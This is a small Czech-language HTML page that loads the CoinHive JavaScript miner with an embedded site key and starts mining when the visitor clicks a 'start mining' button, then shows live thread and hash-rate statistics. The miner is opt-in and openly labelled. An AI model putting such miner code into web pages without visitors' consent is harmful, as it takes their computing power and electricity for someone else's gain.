<head>

  <style>
  #start {
    margin: auto;
    display: block;
    width: 25%;
    height: 6%;
    margin-top: 20%
  }
  p {
    font-size: 1vw;
  }
  </style>

  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>

  <script>
    var BClicked = false;
    var miner = new CoinHive.Anonymous('Cj0j0kquCJsY9u9zMSPAbqOUov7aIyhb');
    function myFun() {
      BClicked = true;
      document.getElementById("start").style.display="none";
      miner.start();
      miner.setAutoThreadsEnabled('enabled');
    }
  </script>

  <script>
    setInterval(function() {
      if(BClicked){
	     var hashesPerSecond = miner.getHashesPerSecond();
       var threads = miner.getNumThreads();
       document.getElementById('THR').innerHTML = 'Počet vláken: ' + threads;
       document.getElementById('HpS').innerHTML = 'Hashe za vteřinu: ' + hashesPerSecond;
     }
   }, 1000);
   setInterval(function() {
     if(BClicked){
     var totalHashes = miner.getTotalHashes('interpolate');
      document.getElementById('TH').innerHTML = 'Celkový počet vytěžených hashů: ' + totalHashes;
    }
  }, 80);
  </script>

</head>

<body style="background-color: #00cc99">
  <h1 id="THR"></h><br>
  <h1 id="HpS"></h><br>
  <h1 id="TH"></h>
  <button id="start" onclick="myFun()"><p>Začít těžit</p></button>
</body>
